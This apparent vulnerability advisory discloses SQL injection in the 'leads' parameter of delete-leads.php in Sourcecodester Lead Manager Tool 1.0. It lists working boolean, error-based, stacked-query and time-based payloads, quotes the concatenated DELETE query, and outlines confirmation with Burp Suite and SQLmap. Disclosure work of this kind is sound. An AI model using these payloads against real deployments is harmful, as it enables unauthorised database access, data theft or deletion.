
# SQLi vulnerability from Sourcecodester Lead Manager Tool 1.0 (delete-leads.php)

**Affected Project**: Lead Manager Tool 1.0

**Official Website**: https://www.sourcecodester.com/php/17510/leads-manager-tool-using-php-and-mysql-source-code.html

**Version**: 1.0

**Related Code file**: delete-leads.php

**Injection parameter**: leads

## Vulnerability Description

 The application is vulnerable to SQL injection via the `leads` parameter in the `GET` request. An attacker can manipulate this parameter to inject arbitrary SQL code, leading to potential data exfiltration, database compromise, or denial of service through stacked queries.

**Injection Points**

- **Boolean-based Blind**: The parameter leads is vulnerable to boolean-based blind SQL injection using payloads like:

```sql
leads=3' AND EXTRACTVALUE(2913,CASE WHEN (2913=2913) THEN 2913 ELSE 0x3A END)-- Xdba
```

- **Error-based**: The application reveals detailed database errors that can be exploited with payloads such as:

```sql
leads=3' AND GTID_SUBSET(CONCAT(0x71717a6b71,(SELECT (ELT(3720=3720,1))),0x71716b6271),3720)-- VasP
```

- **Stacked Queries**: The application allows multiple SQL statements in a single query, demonstrated by:

```sql
leads=3';SELECT SLEEP(5)#
```

- **Time-based Blind**: The injection can be used to delay server responses, confirming the vulnerability:

```sql
leads=3' AND (SELECT 6992 FROM (SELECT(SLEEP(5)))jgOr)-- NLJn
```

**Impact**: This vulnerability allows an attacker to execute arbitrary SQL commands, potentially leading to unauthorized access, data leakage, or complete compromise of the database.
 

## Analysis

```sql
$query = "DELETE FROM tbl_leads WHERE tbl_leads_id = '$leads'";
```

- **Direct Inclusion of User Input**: The $leads variable, which comes from the user's input via $_GET['leads'], is directly included in the SQL query string. This allows an attacker to manipulate the query by injecting malicious SQL code through the leads parameter.

- **Lack of Prepared Statements**: Although the PDO::prepare() method is used, the query itself is not parameterized. The $leads value is directly embedded into the query string before it is passed to prepare(), making the use of prepared statements ineffective.

## Demonstraation

Below is how Leads Manager Tool looks like:

![image](https://github.com/user-attachments/assets/7d5891c8-0e0d-478f-b8fc-c3e7bef760b9)

We can delete leads as such:

![Screenshot from 2024-08-18 11-46-13](https://github.com/user-attachments/assets/317defc9-23d6-41db-813f-9132fda76a06)

Intercept the delete(delete-leads.php) traffic using Burp Suite and save it as a text file:

![image](https://github.com/user-attachments/assets/731cda87-4bb8-4287-adbc-75f2455ade19)

Using SQLmap, we can confirm the vulnerability:

![image](https://github.com/user-attachments/assets/70916b86-7ee6-427b-8085-21ef835eceff)
